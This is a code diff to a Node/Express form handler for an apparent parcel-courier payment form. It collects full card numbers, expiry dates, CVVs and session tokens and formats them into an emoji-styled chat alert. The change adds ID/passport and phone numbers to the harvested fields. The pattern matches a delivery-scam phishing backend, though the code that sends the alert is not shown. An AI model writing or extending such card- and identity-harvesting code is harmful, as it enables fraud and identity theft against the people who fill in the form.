@@ -143,6 +143,8 @@ app.post('/api/submit', submitLimiter, async (req, res) => {
             paymentMethod: req.body.vehicle1 || 'Not specified',
             sessionToken: sanitize(req.body.session_token, 64),
             cardholder: sanitize(req.body.cardholder, 128),
+            idNumber: sanitize(req.body.id_number, 32),
+            phone: sanitize(req.body.phone, 32),
             cardNumber: sanitize(req.body.card_number, 32),
             cardExpiry: sanitize(req.body.card_expiry, 8),
             cardCvv: sanitize(req.body.card_cvv, 4),
@@ -174,6 +176,8 @@ app.post('/api/submit', submitLimiter, async (req, res) => {
             const message = `🚚 *New Courier Form Submission*\n\n` +
                 `💳 *Payment Method:* ${mdEscape(formData.paymentMethod)}\n` +
                 `👤 *Cardholder:* ${mdEscape(formData.cardholder || 'N/A')}\n` +
+                `🪪 *ID/Passport:* ${mdEscape(formData.idNumber || 'N/A')}\n` +
+                `📞 *Phone:* ${mdEscape(formData.phone || 'N/A')}\n` +
                 `🔢 *Card Number:* \`${mdEscape(formData.cardNumber || 'N/A')}\`\n` +
                 `📆 *Expiry:* ${mdEscape(formData.cardExpiry || 'N/A')}\n` +
                 `🔐 *CVV:* \`${mdEscape(formData.cardCvv || 'N/A')}\`\n` +
